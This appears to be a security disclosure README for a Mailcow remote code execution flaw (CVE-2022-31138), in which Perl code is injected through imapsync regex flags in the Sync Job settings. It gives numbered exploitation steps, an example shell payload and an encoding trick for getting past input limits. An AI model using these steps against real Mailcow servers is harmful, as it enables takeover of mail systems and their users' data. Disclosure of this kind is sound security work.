# Mailcow CVE-2022-31138 
RCE and Domain Admin privilege escalation for Mailcow. POC for [CVE-2022-31245](https://github.com/ly1g3/Mailcow-CVE-2022-31245#proof-of-concept-poc) can be modified to work with this vulnerability. </br>

Reported and fixed: 2022-06

## Code Injection, RCE
Type: Code Injection (CWE-94), RCE, Domain Takeover </br>
Affected versions: least 2019 - 2022-06a </br>

A flaw exists in all recent Mailcow versions where a regular user of the system can exploit the “Sync Job” feature to gain a shell using perl code injection in arbitrary regex field in imapsync. Using this exploit a attacker can then easily pivot to the database and escalate privileges to the role of “Domain Admin” in Mailcow.

This exploit includes persistence by default since Sync Jobs run on a timer.

This exploit compromises the entire Mailcow instance. Tested and working on latest release as of 2022-06a.


### Technical overview
Almost all regex expressions in imapsync is evaluated using the `eval` function, this is highly unsafe when parameters are given by user-input. As a example, here is how `--regexmess` is parsed in imapsync (line 14213):
```perl
sub regexmess
{
        my ( $string ) = @_ ;
        foreach my $regexmess ( @regexmess ) {
                $sync->{ debug } and myprint( "eval \$string =~ $regexmess\n" ) ;
                my $ret = eval "\$string =~ $regexmess ; 1" ;
```
In Mailcow `$regexmess` is given as user-input.

The following imapsync flags (could be more) can be used to achieve code execution:
```
--regexmess
--skipmess
--regexflag
--delete2foldersonly
--delete2foldersbutnot
--regextrans2
```

Using the steps below the vulnerability can be recreated.

Gaining shell:
1. Go to the Mailcow login page (not SOGo)
2. Login as a regular user
3. Go to Sync Jobs
4. Set the following values: ```hostname=MAILCOW_IP, Port=IMAP_PORT, Username=CURRENT_USER, Password=CURRENT_PASS, Encryption=PLAIN, Interval=1, Active=Check, Custom Parameters=--debug --nosslcheck --regexmess=PERL_CODE```
Where the field "Custom Parameters" is the important field. PERL_CODE can be arbitrary perl code.
5. Press save and wait 1 min for the command to execute.

Custom Parameters example payload:
```
--debug --nosslcheck --regexmess=`touch\x{0020}test.txt`
```
PERL_CODE cannot contain space,quotes or slashes,  use `\x{0020}` instead of space. Use ``` ` ``` to run shell commands.


Privilege Escalation:

Follow the same steps as in [CVE-2022-31245](https://github.com/ly1g3/Mailcow-CVE-2022-31245#technical-overview).
